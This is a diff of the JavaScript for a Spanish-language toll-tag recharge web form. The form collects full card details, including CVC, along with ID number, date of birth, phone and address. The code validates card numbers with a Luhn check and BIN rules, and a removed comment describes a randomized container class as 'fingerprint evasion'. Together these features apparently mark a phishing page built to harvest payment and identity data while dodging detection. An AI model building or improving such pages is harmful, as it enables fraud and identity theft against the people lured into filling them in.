+            const daysInMonth = new Date(year, monthIndex, 0).getDate();
+            for (let day = 1; day <= daysInMonth; day++) {
+                const option = document.createElement('option');
+                option.value = day;
+                option.textContent = day;
+                dobDay.appendChild(option);
             }
+        }
+
+        dobYear.addEventListener('change', populateDays);
+        dobMonth.addEventListener('change', populateDays);
+
+        // Debounced Formateo de teléfono (fixes iOS cursor)
+        const phoneInput = document.getElementById('phone');
+        let phoneTimeout;
+        phoneInput.addEventListener('input', function(e) {
+            clearTimeout(phoneTimeout);
+            phoneTimeout = setTimeout(() => {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length === 0) {
+                    e.target.value = '';
+                    return;
+                }
+                value = value.substring(0, 8);
+                if (value.length > 4) {
+                    e.target.value = value.substring(0, 4) + '-' + value.substring(4);
+                } else {
+                    e.target.value = value;
+                }
+            }, 10);
         });
-    });
+        if (isIOS) {
+            phoneInput.addEventListener('blur', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                value = value.substring(0, 8);
+                if (value.length > 4) {
+                    e.target.value = value.substring(0, 4) + '-' + value.substring(4);
+                } else {
+                    e.target.value = value;
+                }
+            });
+        }
 
-    // Numeric input restrictions for relevant fields
-    const numericFields = ['cvc', 'cedula', 'zip'];
-    numericFields.forEach(fieldId => {
-        const field = document.getElementById(fieldId);
-        field.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (fieldId === 'cvc' && value.length > 4) value = value.substring(0, 4);
-            else if (fieldId === 'cedula' && value.length > 9) value = value.substring(0, 9);
-            else if (fieldId === 'zip' && value.length > 10) value = value.substring(0, 10);
-            e.target.value = value;
+        // Restricciones numéricas with debounce
+        ['cvc', 'cedula', 'zip'].forEach(fieldId => {
+            const field = document.getElementById(fieldId);
+            let timeout;
+            field.addEventListener('input', function(e) {
+                clearTimeout(timeout);
+                timeout = setTimeout(() => {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (fieldId === 'cvc' && value.length > 4) value = value.substring(0, 4);
+                    else if (fieldId === 'cedula' && value.length > 9) value = value.substring(0, 9);
+                    else if (fieldId === 'zip' && value.length > 10) value = value.substring(0, 10);
+                    e.target.value = value;
+                }, 10);
+            });
         });
-    });
 
-    // Randomized container class for fingerprint evasion
-    (function() {
-        var randomClass = ['container-var1', 'container-var2', 'container-var3'][Math.floor(Math.random() * 3)];
-        document.getElementById('dynamic-container').classList.add(randomClass);
-    })();
+        // Debounced Manejo de tarjeta (plain icon, no brand changes)
+        const cardInput = document.getElementById('card_number');
+        const cardBrandImg = document.getElementById('card-brand');
+        let cardTimeout;
+        cardInput.addEventListener('input', function(e) {
+            clearTimeout(cardTimeout);
+            cardTimeout = setTimeout(() => {
+                let value = e.target.value.replace(/\D/g, '');
+                value = value.substring(0, 19);
+                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+                e.target.value = value;
 
-    document.getElementById('rechargeForm').addEventListener('submit', function(event) {
-        let isValid = true;
-        clearErrors();
-        let firstErrorField = null;
-
-        const tag = document.getElementById('tag').value.trim();
-        if (!tag) {
-            showError('tagError', 'Por favor, ingresa el número de tag.');
-            if (!firstErrorField) firstErrorField = document.getElementById('tag');
-            isValid = false;
-        } else if (!/^\d{10}$/.test(tag)) {
-            showError('tagError', 'El número de tag debe tener 10 dígitos.');
-            if (!firstErrorField) firstErrorField = document.getElementById('tag');
-            isValid = false;
-        }
-
-        // Removed amount validation since field is removed
-
-        // Removed payment method check since it's always CC now
-        const fullName = document.getElementById('full_name').value.trim();
-        if (!fullName) {
-            showError('fullNameError', 'Por favor, ingresa el nombre del titular.');
-            if (!firstErrorField) firstErrorField = document.getElementById('full_name');
-            isValid = false;
-        }
-
-        const cardNumber = document.getElementById('card_number').value.trim();
-        if (!cardNumber) {
-            showError('cardNumberError', 'Por favor, ingresa el número de tarjeta.');
-            if (!firstErrorField) firstErrorField = document.getElementById('card_number');
-            isValid = false;
-        } else if (!/^\d{13,19}$/.test(cardNumber.replace(/\s/g, ''))) {
-            showError('cardNumberError', 'El número de tarjeta debe tener entre 13 y 19 dígitos.');
-            if (!firstErrorField) firstErrorField = document.getElementById('card_number');
-            isValid = false;
-        } else if (!luhnCheck(cardNumber)) {
-            showError('cardNumberError', 'Número de tarjeta inválido.');
-            if (!firstErrorField) firstErrorField = document.getElementById('card_number');
-            isValid = false;
-        } else if (!validateBin(cardNumber)) {
-            showError('cardNumberError', 'BIN inválido (no corresponde a Visa, Mastercard, Amex o Discover).');
-            if (!firstErrorField) firstErrorField = document.getElementById('card_number');
-            isValid = false;
-        }
-
-        const expiry = document.getElementById('expiry').value.trim();
-        if (!expiry) {
-            showError('expiryError', 'Por favor, ingresa la fecha de expiración.');
-            if (!firstErrorField) firstErrorField = document.getElementById('expiry');
-            isValid = false;
-        } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
-            showError('expiryError', 'La fecha debe estar en formato MM/YY.');
-            if (!firstErrorField) firstErrorField = document.getElementById('expiry');
-            isValid = false;
-        } else {
-            const [, month, year] = expiry.match(/(\d{2})\/(\d{2})/);
-            const expiryYear = parseInt('20' + year);
-            if (expiryYear < 2025) {
-                showError('expiryError', 'La fecha de expiración debe ser 2025 o posterior.');
-                if (!firstErrorField) firstErrorField = document.getElementById('expiry');
-                isValid = false;
-            }
-        }
-     const cvc = document.getElementById('cvc').value.trim();
-        if (!cvc) {
-            showError('cvcError', 'Por favor, ingresa el código CVC.');
-            if (!firstErrorField) firstErrorField = document.getElementById('cvc');
-            isValid = false;
-        } else if (!/^\d{3,4}$/.test(cvc)) {
-            showError('cvcError', 'El CVC debe tener 3 o 4 dígitos.');
-            if (!firstErrorField) firstErrorField = document.getElementById('cvc');
-            isValid = false;
-        }
-
-        const email = document.getElementById('email').value.trim();
-        if (!email) {
-            showError('emailError', 'Por favor, ingresa el correo electrónico.');
-            if (!firstErrorField) firstErrorField = document.getElementById('email');
-            isValid = false;
-        } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-            showError('emailError', 'Por favor, ingresa un correo electrónico válido.');
-            if (!firstErrorField) firstErrorField = document.getElementById('email');
-            isValid = false;
-        } else {
-            const domain = email.substring(email.indexOf('@') + 1).toLowerCase();
-            if (!validDomains.includes(domain)) {
-                showError('emailError', 'Dominio no permitido. Use un dominio común como gmail.com o yahoo.com.');
-                if (!firstErrorField) firstErrorField = document.getElementById('email');
-                isValid = false;
-            }
-        }
-
-        const phone = document.getElementById('phone').value.trim();
-        if (!phone) {
-            showError('phoneError', 'Por favor, ingresa el número de teléfono.');
-            if (!firstErrorField) firstErrorField = document.getElementById('phone');
-            isValid = false;
-        } else {
-            const phoneClean = phone.replace(/\D/g, '');
-            if (phoneClean.length !== 8) {
-                showError('phoneError', 'El teléfono debe tener 8 dígitos.');
-                if (!firstErrorField) firstErrorField = document.getElementById('phone');
-                isValid = false;
-            }
-        }
-
-        const year = document.getElementById('dob-year').value;
-        const monthName = document.getElementById('dob-month').value;
-        const day = document.getElementById('dob-day').value;
-        if (!year || !monthName || !day) {
-            showError('dobError', 'Por favor, selecciona la fecha completa de nacimiento.');
-            if (!firstErrorField) firstErrorField = document.getElementById('dob-year');
-            isValid = false;
-        } else {
-            const monthIndex = monthNames.indexOf(monthName) + 1;
-            const dobDate = new Date(year, monthIndex - 1, day);
-            const now = new Date();
-            const age = now.getFullYear() - dobDate.getFullYear() - (now < new Date(now.getFullYear(), dobDate.getMonth(), dobDate.getDate()) ? 1 : 0);
-            if (age < 18) {
-                showError('dobError', 'Debes tener al menos 18 años.');
-                if (!firstErrorField) firstErrorField = document.getElementById('dob-year');
-                isValid = false;
-            }
-        }
-
-        const cedula = document.getElementById('cedula').value.trim();
-        if (!cedula) {
-            showError('cedulaError', 'Por favor, ingresa el número de cédula.');
-            if (!firstErrorField) firstErrorField = document.getElementById('cedula');
-            isValid = false;
-        } else if (!/^\d{7,9}$/.test(cedula)) {
-            showError('cedulaError', 'El número de cédula debe tener entre 7 y 9 dígitos.');
-            if (!firstErrorField) firstErrorField = document.getElementById('cedula');
-            isValid = false;
-        }
-
-        const street = document.getElementById('street').value.trim();
-        if (!street) {
-            showError('streetError', 'Por favor, ingresa la dirección.');
-            if (!firstErrorField) firstErrorField = document.getElementById('street');
-            isValid = false
-   }
-
-        const city = document.getElementById('city').value.trim();
-        if (!city) {
-            showError('cityError', 'Por favor, ingresa la ciudad.');
-            if (!firstErrorField) firstErrorField = document.getElementById('city');
-            isValid = false;
-        }
-
-        const province = document.getElementById('province').value.trim();
-        if (!province) {
-            showError('provinceError', 'Por favor, ingresa la provincia.');
-            if (!firstErrorField) firstErrorField = document.getElementById('province');
-            isValid = false;
-        }
-
-        const zip = document.getElementById('zip').value.trim();
-        if (!zip) {
-            showError('zipError', 'Por favor, ingresa el código postal.');
-            if (!firstErrorField) firstErrorField = document.getElementById('zip');
-            isValid = false;
-        }
-
-        if (!isValid) {
-            event.preventDefault();
-            // Scroll to the first error field
-            if (firstErrorField) {
-                firstErrorField.scrollIntoView({ behavior: 'smooth', block: 'center' });
-            }
-        }
-    });
-
-    function showError(id, message) {
-        const errorDiv = document.getElementById(id);
-        errorDiv.textContent = message;
-        errorDiv.style.display = 'block';
-    }
-
-    function clearErrors() {
-        const errors = document.querySelectorAll('.error');
-        errors.forEach(error => {
-            error.textContent = '';
-            error.style.display = 'none';
+                // Keep the icon plain (no brand changes)
+            }, 10);
         });
-    }
 
-    function clearError(id) {
-        const errorDiv = document.getElementById(id);
-        errorDiv.textContent = '';
-        errorDiv.style.display = 'none';
-    }
-</script>
+        // Updated Debounced Formateo de expiración with setTimeout for iOS cursor fix
+        const expiryInput = document.getElementById('expiry');
+        let expiryTimeout;
+        expiryInput.addEventListener('input', function(e) {
+            clearTimeout(expiryTimeout);
+            expiryTimeout = setTimeout(() => {
+                const originalValue = this.value;
+                let digits = originalValue.replace(/[^\d]/g, '');
+                digits = digits.substring(0, 4);
+
+                let formatted;
+                if (e.inputType === 'deleteContentBackward' || e.inputType === 'deleteContentForward') {
+                    formatted = digits;
+                } else {
+                    formatted = digits;
+                    if (digits.length >= 2) {
+                        formatted = digits.substring(0, 2) + '/' + digits.substring(2);
+                    }
+                }
+
+                if (formatted.includes('/')) {
+                    const month = parseInt(formatted.substring(0, 2));
+                    if (month < 1 || month > 12) {
+                        const cappedMonth = month < 1 ? '01' : '12';
+                        formatted = cappedMonth + formatted.substring(2);
+                    }
+                }
+
+                if (formatted.includes('/')) {
+                    const yearPart = parseInt(formatted.substring(3, 5));
+                    if (yearPart === 0 || yearPart < 26) {
+                        showError('expiryError', 'El año debe ser 26 o superior (ej. 26 para 2026).');
+                    } else {
+                        clearError('expiryError');
+                    }
+                } else {
+                    clearError('expiryError');
+                }
+
+                this.value = formatted;
+
+                // Deferred cursor setting for iOS
+                setTimeout(() => {
+                    const newCursorPos = formatted.length;
+                    this.setSelectionRange(newCursorPos, newCursorPos);
+                }, isIOS ? 20 : 0);
+            }, 10);
+        });
+        if (isIOS) {
+            expiryInput.addEventListener('blur', function(e) {
+                let digits = e.target.value.replace(/[^\d]/g, '');
+                digits = digits.substring(0, 4);
+                let formatted = digits;
+                if (digits.length >= 2) {
+                    formatted = digits.substring(0, 2) + '/' + digits.substring(2);
+                }
+                e.target.value = formatted;
+            });
+        }
+
+        // Verificación Luhn
+        function luhnCheck(cardNumber) {
+            cardNumber = cardNumber.replace(/\D/g, '');
+            if (!/^\d{13,19}$/.test(cardNumber)) return false;
+
+            let sum = 0;
+            let shouldDouble = false;
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+                if (shouldDouble) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return sum % 10 === 0;
+        }
+
+        // Validación BIN
+        function validateBin(cardNumber) {
+            const bin = cardNumber.substring(0, 6);
+            if (/^4/.test(bin)) return 'Visa';
+            if (/^5[1-5]/.test(bin)) return 'Mastercard';
+            if (/^3[47]/.test(bin)) return 'American Express';
+            if (/^6(?:011|5)/.test(bin)) return 'Discover';
+            return false;
+        }
+
+        // Clase de contenedor aleatoria
+        (function() {
+            var randomClass = ['container-var1', 'container-var2', 'container-var3'][Math.floor(Math.random() * 3)];
+            document.getElementById('dynamic-container').classList.add(randomClass);
+        })();
+
+        function showError(id, message) {
+            const errorDiv = document.getElementById(id);
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            // Scroll to the field and highlight
+            const fieldId = id.replace('Error', '');
+            const field = document.getElementById(fieldId);
+            if (field) {
+                field.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                field.classList.add('error-field');
+                field.focus();
+            }
+        }
+
+        function clearErrors() {
+            const errors = document.querySelectorAll('.error');
+            errors.forEach(error => {
+                error.textContent = '';
+                error.style.display = 'none';
+            });
+            const fields = document.querySelectorAll('input, select');
+            fields.forEach(field => field.classList.remove('error-field'));
+        }
+
+        function clearError(id) {
+            const errorDiv = document.getElementById(id);
+            errorDiv.textContent = '';
+            errorDiv.style.display = 'none';
+        }
+    </script>
 </body>
 </html>
